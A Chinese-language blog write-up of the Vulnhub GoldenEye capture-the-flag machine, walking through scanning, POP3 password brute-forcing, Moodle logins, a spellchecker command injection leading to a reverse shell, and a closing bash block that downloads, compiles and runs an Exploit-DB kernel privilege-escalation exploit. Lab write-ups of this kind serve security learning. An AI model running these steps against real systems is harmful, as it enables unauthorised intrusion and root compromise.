---
title: Vulnhub - GoldenEye の Write-Up
date: 2020-01-13 19:07:21
categories:
- WriteUPs
- Vulnhub
tags:
- Web
---
## 前言

这两天尝试了下[GoldenEye](https://www.vulnhub.com/entry/goldeneye-1,240/)这台靶机，难度不大，但是有坑，也能学到不少的东西，主要是可以接触到POP3渗透方面的知识。

<!-- more -->

## Step 1

首先第一步还是传统的找靶机IP以及端口扫描：

![](/img/GoldenEye/GoldenEye1.png)

![](/img/GoldenEye/GoldenEye2.png)

可以看到靶机开启了SMTP和POP3服务。

## Step 2

首先访问一下80端口的WEB服务：

![](/img/GoldenEye/GoldenEye3.png)

再按照提示访问/sev-home/：

![](/img/GoldenEye/GoldenEye4.png)

提示这是GoldenEye的授权登录入口。我们暂时还没有帐号和密码，只能再寻找其他线索。回到首页，查看首页源码，在terminal.js中发现重要的信息：

![](/img/GoldenEye/GoldenEye5.png)

提示中告诉了我们Boris的密码，是Unicode编码的，去解密：

![](/img/GoldenEye/GoldenEye6.png)

然后我们用解出的密码登录GoldenEye系统：

![](/img/GoldenEye/GoldenEye7.png)

提示我们在一个不常用的端口开启了pop3的服务，当然就是我们扫描时扫到的55007端口。然后查看该页面源代码，发现在最底下还有个hint：

![](/img/GoldenEye/GoldenEye8.png)

## Step 3

上一步的提示告诉我们两个帐号，结合POP3服务的提示，猜测下一步便要爆破密码：

![](/img/GoldenEye/GoldenEye9.png)

![](/img/GoldenEye/GoldenEye10.png)

果然爆破出来两个帐号的密码，然后尝试用着两个帐号密码登录55007端口的POP3邮箱：

![](/img/GoldenEye/GoldenEye11.png)

可以看到Boris账户里有3封邮件，但是这3封邮件并没有任何有价值的信息。再登录Natalya的账户，有2封邮件：

![](/img/GoldenEye/GoldenEye12.png)

![](/img/GoldenEye/GoldenEye13.png)

第二封邮件给了我们一个账号以及提示，我们按照提示的步骤首先添加域名，然后访问看看会遇到什么：

![](/img/GoldenEye/GoldenEye14.png)

这是一个Moodle系统，利用邮件里的帐号和密码登录系统：

![](/img/GoldenEye/GoldenEye15.png)

![](/img/GoldenEye/GoldenEye16.png)

登录之后就收到一封邮件，查看邮件具体内容发现就是简单的欢迎信件，然后发现Dr.Doak的邮箱用户名为doak：

![](/img/GoldenEye/GoldenEye17.png)

好吧，再去爆破一下doak的帐号和密码：

![](/img/GoldenEye/GoldenEye18.png)

登陆一下，找找有没有有用的信息：

![](/img/GoldenEye/GoldenEye19.png)

提示我们回到原来的网站用这个账户去登录寻找进一步的信息：

![](/img/GoldenEye/GoldenEye20.png)

## Step 4

在Dr.Doak账户里我们找到Moodle为2.2.3版本，下一步就是去找一些可以利用的漏洞了。在MSF中找到一个moodle的利用模块，但是该模块需要admin的账户密码，只能继续寻找，在dr_doak账户的私人文件中找到一个txt文件：

![](/img/GoldenEye/GoldenEye21.png)

下载下来，打开看一下内容：

![](/img/GoldenEye/GoldenEye22.png)

按照提示下载照片：

![](/img/GoldenEye/GoldenEye23.png)

发现照片里藏了一串奇怪的base64编码：

![](/img/GoldenEye/GoldenEye24.png)

解密一下得到：xWinter1995x!

尝试了一下，发现这是梦寐以求的admin用户密码：

![](/img/GoldenEye/GoldenEye25.png)

于是继续之前的MSF利用模块：

![](/img/GoldenEye/GoldenEye26.png)

但是会发现利用失败，因为我的MSF是最新版本，rhosts会根据域名到hosts文件中寻找，然后自动替换成IP，而靶机上的这个网站限制了只能通过域名访问，所以漏洞无法利用成功，只能找下这个漏洞利用模块的源代码，尝试手动利用。

![](/img/GoldenEye/GoldenEye27.png)

首先根据利用脚本将Spell engine改成PSpellShell：

![](/img/GoldenEye/GoldenEye28.png)

然后根据提示在aspellpath处插入payload：

![](/img/GoldenEye/GoldenEye29.png)

通过shellpop创建pythonf反弹shell的payload：

![](/img/GoldenEye/GoldenEye30.png)

创建一篇新的blog，随便写点内容，然后点击Toggle spellchecker即可触发payload得到反弹shell：

![](/img/GoldenEye/GoldenEye31.png)

![](/img/GoldenEye/GoldenEye32.png)

## Step 5

通过上一步我们得到了一个低权限的账号，下一步就是提权。使用`uname -a`命令查看靶机内核版本：

![](/img/GoldenEye/GoldenEye33.png)

找一下提权的利用脚本：

![](/img/GoldenEye/GoldenEye34.png)

然后利用该脚本即可获取该靶机root权限了，具体操作如下：

```bash
$ cd /tmp # 进入/tmp目录，方便读写
$ wget https://www.exploit-db.com/download/37292.c
$ sed -i 's/gcc/cc/g' 37292.c # 系统内没有gcc,所以只能用cc代替
$ cc 37292.c -o evil # 编译exp
$ chmod 700 evil
$ ./evil
```